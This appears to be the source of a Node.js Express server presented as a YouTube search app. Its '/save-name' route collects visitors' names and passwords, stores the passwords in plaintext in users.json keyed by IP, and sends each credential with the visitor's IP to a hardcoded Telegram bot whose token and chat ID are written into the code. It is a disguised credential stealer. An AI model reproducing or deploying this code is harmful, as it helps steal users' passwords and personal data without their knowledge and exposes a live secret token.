import express from 'express';
import fs from 'fs';
import path from 'path';
import bodyParser from 'body-parser';
import axios from 'axios';
import ytSearch from 'yt-search';

const app = express();
const port = process.env.PORT || 3000;
const DATA_FILE = path.join(path.dirname(import.meta.url), 'users.json');  // Path to users.json

app.use(bodyParser.urlencoded({ extended: true }));
app.set('view engine', 'ejs');

// Function to read users data from the users.json file
function readUserData() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return [];  // Return empty array if file is not found or has issues
    }
}

// Function to write users data to the users.json file
function writeUserData(users) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2), 'utf8');
    } catch (error) {
        console.error('Error writing to file', error);
    }
}

// Home route to ask for user's name
app.get('/', (req, res) => {
    res.render('name');
});

// Handle search request
app.post('/search', async (req, res) => {
    const query = req.body.query;

    try {
        // Search for the video using yt-search package
        const searchResults = await ytSearch(query);

        // Render search results
        res.render('search', { results: searchResults.videos });
    } catch (error) {
        console.error('Error while searching:', error);
        res.render('search', { results: [] });
    }
});

// Save user name and password
app.post('/save-name', (req, res) => {
    const { userName, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;  // Get user IP address

    // Read existing users from the file
    const users = readUserData();

    // Check if the user with this IP already exists
    const existingUser = users.find(user => user.ip === ip);

    if (existingUser) {
        // If user exists, login with the existing password
        if (existingUser.password === password) {
            // Send data to Telegram bot
            sendToTelegram(`User logged in:\nName: ${userName}\nPassword: ${password}\nIP: ${ip}`);
            return res.redirect('/search');
        } else {
            return res.status(401).send('Incorrect password');
        }
    } else {
        // If no user exists with this IP, create a new entry
        users.push({
            ip,
            userName,
            password
        });

        // Save updated user data
        writeUserData(users);

        // Send data to Telegram bot
        sendToTelegram(`New user registered:\nName: ${userName}\nPassword: ${password}\nIP: ${ip}`);

        return res.redirect('/search');
    }
});

// Function to send messages to Telegram bot
function sendToTelegram(message) {
    const TELEGRAM_BOT_TOKEN = '7981577790:AAHhoGXjXGj2UCRKsSHWKXkAWH-HlKhiNk8';
    const TELEGRAM_CHAT_ID = '5901409601';

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    })
    .then(response => {
        console.log('Message sent to Telegram:', response.data);
    })
    .catch(error => {
        console.error('Error sending message to Telegram:', error);
    });
}

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
